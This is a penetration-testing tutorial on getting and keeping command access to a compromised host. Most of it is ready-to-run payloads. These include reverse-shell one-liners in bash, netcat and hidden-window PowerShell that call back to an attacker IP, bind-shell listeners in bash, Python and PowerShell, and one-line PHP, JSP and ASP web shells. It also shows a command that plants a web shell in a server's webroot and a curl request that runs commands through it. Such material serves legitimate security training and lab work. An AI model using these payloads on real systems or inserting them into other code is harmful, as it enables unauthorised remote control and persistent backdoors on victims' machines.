# Types of Shells
Once we compromise a system and exploit a vulnerability to execute commands on the compromised hosts remotely, we usually need a method of communicating with the system not to have to keep exploiting the same vulnerability to execute each command. To enumerate the system or take further control over it or within its network, we need a reliable connection that gives us direct access to the system's shell, i.e., Bash or PowerShell, so we can thoroughly investigate the remote system for our next move.

If we don't have the credentials for a SSH or WinRM login, we have to use remote code execution through shells. There are three types of shells:
* **Reverse Shell**: Connects back to our system and gives us control through a reverse connection.
* **Bind Shell**: Waits for us to connect to it and gives us control once we do.
* **Web Shell**: Communicates through a web server, accepts our commands through HTTP parameters, executes them, and prints back the output.

## Reverse Shell
To open a Reverse Shell, the first thing we need to do is start a listener on our system. For example with netcat:
```
nc -lvnp 1234
```
* `-l` listen mode
* `-v` verbose mode
* `-n` disable DNS resolution
* `-p` the port to listen on

If the listener is running, we can execute the Reverse Shell on the target system. On a Linux system, that can be done with one of the following commands:
```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

And on a Windows system we can run the following Powershell command:
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.10",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

The IP `10.10.10.10` has to be replaced with the IP of our system where the listener is running. As well, we have to use the same port that we selected for the listener.

If the command executes successful, the listener shows the incoming connection and has now the ability to take commands.

More payloads for different programs and languages can be found here: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

## Bind Shell
Like already said, with the Bind Shell we have to connect to the targets listening port.

To create such a listening port we can for example use the following bash command:
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

Or a python command:
```bash
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

And on a Windows system a Powershell command:
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```

`1234` is the port that we are listening on and `0.0.0.0` represents that we are listening on all interfaces.

To connect to the listener we can use Netcat again:
```bash
nc 10.10.10.1 1234
```

The IP has to be the IP of the target system and the port has to be the port that we chose. If the Bind Shell was successful, Netcat takes commands.

More payloads for different programs and languages can be found here: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md

## Upgrading TTY
A shell through Netcat is very unstable and does not allow the use of any special keys. For example using the arrow keys results in different unusable input characters.

To get full functional shell, we can upgrade our TTY. To do so we have to map our terminal TTY with the remote TTY.

### python/stty
To achieve this, we can use the following commands:
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

After this, we background our shell with `CTRL + Z`, input the following `stty` command and foreground our shell again:
```
www-data@remotehost$ ^Z

$ stty raw -echo
$ fg

[Enter]
[Enter]
www-data@remotehost$
```

Now we got a fully working TTY shell.

As last step we can set the size and the `TERM` variable. For example:
```
www-data@remotehost$ export TERM=xterm-256color
www-data@remotehost$ stty rows 67 columns 318
```

To get the right settings, we can check the values in a TTY on our system:
```
$ echo $TERM
xterm-256color
$ stty size
67 318
```

## Web Shell
A Web Shell is typically a web script, i.e., PHP or ASPX, that accepts our command through HTTP request parameters, executes our command, and prints its output back on the web page.

The script itself is often an oneliner, that takes a command through a GET request. Those can look like the following:

php:
```php
<?php system($_REQUEST["cmd"]); ?>
```

jsp:
```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

asp:
```asp
<% eval request("cmd") %>
```

Now we have to upload this script onto the target's web directory. If we than access the path, the script will be executed. This is often done through a vulnerability in an upload feature.

If we have the ability to run a remote code execution on the target, we can create the shell as followed:
```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```

For different web servers there different default paths of the webroot:
* Apache: `/var/www/html/`
* Nginx: `/usr/local/nginx/html/`
* IIS: `C:\inetpub\wwwroot\`
* XAMPP: `C:\xampp\htdocs\`

Keep in mind, that this part can also be changed.

To access our webshell we can use for example `cURL` or simply a browser:
```
$ curl http://SERVER_IP:PORT/shell.php?cmd=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

A benefit of a web shell is that it would bypass any firewall restrictions, as it will not open a new connection on a different port. Another benefit is that the web shell is more persistence. If the system is rebooted, the file still exists.

But the downside is obviously, that the web shell isn't that interactive like a fully shell.